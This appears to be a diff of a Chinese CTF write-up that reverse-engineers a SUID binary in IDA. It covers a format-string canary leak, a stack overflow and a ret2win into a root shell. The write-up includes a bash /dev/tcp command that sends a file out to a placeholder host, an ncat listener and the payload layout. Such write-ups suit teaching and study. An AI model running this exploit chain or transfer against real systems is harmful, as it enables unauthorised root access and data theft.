@@ -558,104 +558,66 @@ python baji_rce.py "find / -xdev -perm -4000 -type f -printf '%M %u %g %p\n' 2>/
 
 系统自带的 SUID 比如 `passwd`、`sudo`、`mount` 都正常，`/opt/vaultd` 明显是题目自定义程序。
 
-# /opt/vaultd 逆向分析
+# IDA 分析 /opt/vaultd
 
-
-把文件拉下来，IDA打开
-
-
-先看文件信息和字符串：
-
-```bash
-python baji_rce.py "ls -la /opt/vaultd; file /opt/vaultd; strings -a /opt/vaultd | head -200"
-```
-
-关键输出：
+先把 `/opt/vaultd` 拉回本地，用 IDA64 打开。这里要注意，如果 Windows 端用 PowerShell 的 `>` 直接接收二进制，文件可能会被当成文本重编码，IDA 会提示 `You have just loaded a binary file`。正常 ELF 文件头应该是：
 
 ```text
--rwsr-xr-x 1 root root 16432 May 27 21:36 /opt/vaultd
-/opt/vaultd: setuid ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
+7F 45 4C 46
+```
 
-/bin/sh
-VaultLite Backup Assistant
-1. create backup note
-2. print support ticket
-3. restore from recipe
-4. exit
-[maintenance] win function reached!
+如果文件头不对，重新传一遍。比如 Windows 端监听时用 `cmd /c` 做二进制重定向：
+
+```powershell
+cmd /c "ncat.exe -lvnp 9001 > vaultd.elf"
+```
+
+目标机没有 `nc` 的话，可以用 bash 的 `/dev/tcp` 发送：
+
+```bash
+bash -c 'cat /opt/vaultd > /dev/tcp/<Windows_IP>/9001'
+```
+
+IDA64 正常识别后，左侧 Functions 窗口能直接看到这些函数名：
+
+```text
+support_ticket
 hidden_maintenance_shell
 restore_recipe
-support_ticket
 ```
 
-程序没有 strip，符号名都在。`hidden_maintenance_shell` 一看就是 ret2win 目标。
-
-用 `nm` 看地址：
-
-```bash
-python baji_rce.py "nm -n /opt/vaultd 2>/dev/null"
-```
-
-关键地址：
-
-```text
-0000000000401314 t support_ticket
-00000000004013cb t hidden_maintenance_shell
-0000000000401468 t restore_recipe
-```
-
-程序是非 PIE：
-
-```bash
-python baji_rce.py "readelf -hW /opt/vaultd | grep Type"
-```
-
-输出：
-
-```text
-Type: EXEC (Executable file)
-```
-
-所以 `hidden_maintenance_shell` 地址固定是：
+程序没有 strip，符号名都在，所以逆向很舒服。`hidden_maintenance_shell` 一看就是 ret2win 目标。IDA 里它的地址是：
 
 ```text
 0x4013cb
 ```
 
-## 格式化字符串泄露 canary
+程序加载基址是常见的 `0x400000`，函数地址也是 `0x401xxx` 这种固定地址，说明它是非 PIE 程序。后面覆盖返回地址时可以直接用 `0x4013cb`。
 
-`support_ticket` 的反汇编关键逻辑：
+## support_ticket：格式化字符串泄露 canary
 
-```asm
-40133d: lea    rax,[rbp-0x90]
-401344: mov    edx,0x7f
-401351: call   read@plt
-...
-40138f: lea    rax,[rbp-0x90]
-401396: mov    rdi,rax
-40139e: call   printf@plt
-```
-
-也就是：
+在 IDA 左边双击 `support_ticket`，按 `F5` 看伪代码，核心逻辑类似：
 
 ```c
-read(0, buf, 0x7f);
+read(0, buf, 0x7F);
 printf(buf);
 ```
 
-典型格式化字符串漏洞。直接往菜单 2 输入一串 `%p`：
+这里 `printf()` 的格式字符串来自用户输入，不是固定字符串，所以是典型格式化字符串漏洞。这个点用来泄露栈上的 canary。
+
+先在目标机上动态测一串 `%p`：
 
 ```bash
 printf '2\n%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p\n4\n' | /opt/vaultd
 ```
 
-可以看到一个以 `00` 结尾的随机值：
+能看到一个以 `00` 结尾的随机值：
 
 ```text
 0xe644898730fb5d00
 ```
 
-这类值很像 stack canary。进一步单独验证参数位置，发现是第 25 个参数：
+这类值很像 stack canary。继续单独验证参数位置，发现是第 25 个参数：
 
 ```bash
 printf '2\n%25$p\n4\n' | /opt/vaultd
@@ -673,40 +635,35 @@ Ticket preview: 0x4b848231a4da7c00
 %25$p
 ```
 
-## restore_recipe 栈溢出
+IDA 能帮我们确认 `printf(buf)` 这个漏洞点，但 `%25$p` 这种具体栈参数位置还是要运行时测一下。
 
-`restore_recipe` 的反汇编关键逻辑：
+## restore_recipe：栈溢出
 
-```asm
-40146c: sub    rsp,0x50
-...
-40148e: mov    edx,0x400
-401493: lea    rax,[rip+0x2bc6]        # 404060 <stage>
-4014a2: call   read@plt
-...
-4014b6: lea    rax,[rbp-0x50]
-4014ba: mov    edx,0x180
-4014c7: call   read@plt
+再看 `restore_recipe`，按 `F5` 后能看到两次读入。伪代码大概是：
+
+```c
+read(0, stage, 0x400);
+read(0, buf, 0x180);
 ```
 
-函数栈上只开了 `0x50`，但第二次读入会往 `[rbp-0x50]` 读 `0x180`，存在明显栈溢出。
+第二次读入很关键：`buf` 是栈上的局部变量，大小只有 `0x50` 左右，但程序往里面读了 `0x180`，存在明显栈溢出。
 
-栈布局大概是：
+为了算偏移，切回反汇编或者打开 Stack view。关键位置是：
 
 ```text
-rbp-0x50    buffer
-rbp-0x08    canary
-rbp         saved rbp
-rbp+0x08    return address
+buf       rbp-0x50
+canary    rbp-0x08
+saved rbp rbp
+ret       rbp+0x08
 ```
 
-所以从 buffer 到 canary 的距离是：
+所以从 `buf` 到 canary 的距离是：
 
 ```text
 0x50 - 0x08 = 0x48
 ```
 
-payload 结构：
+payload 结构就是：
 
 ```text
 'A' * 0x48
@@ -715,7 +672,9 @@ payload 结构：
 + p64(0x4013cb)
 ```
 
-`hidden_maintenance_shell` 里面会执行提权 shell。反汇编里可以看到它先做 syscall 设置 uid/gid，然后执行 `/bin/sh -p`：
+## hidden_maintenance_shell：ret2win 目标
+
+最后看 `hidden_maintenance_shell`。伪代码可能不一定很好看，因为里面直接用了 syscall；切到反汇编更清楚：
 
 ```asm
 4013fa: mov    rax,0x77
@@ -728,8 +687,16 @@ payload 结构：
 40142d: syscall
 ```
 
-`-p` 很关键，它会让 shell 保留 SUID 程序得到的有效 root 权限。
+`0x3b` 是 `execve`，这里最终执行的是 `/bin/sh -p`。`-p` 很关键，它会让 shell 保留 SUID 程序得到的有效 root 权限。
 
+所以这段二进制的利用逻辑就是：
+
+```text
+support_ticket 的 printf(buf) 泄露 canary
+-> restore_recipe 的栈溢出覆盖返回地址
+-> 返回到 hidden_maintenance_shell
+-> 执行 /bin/sh -p 拿 root shell
+```
 # 自动化 ret2win
 
 为了保证泄露 canary 和溢出发生在同一个 `/opt/vaultd` 进程里，我写了一个 Python 脚本在目标机上执行：
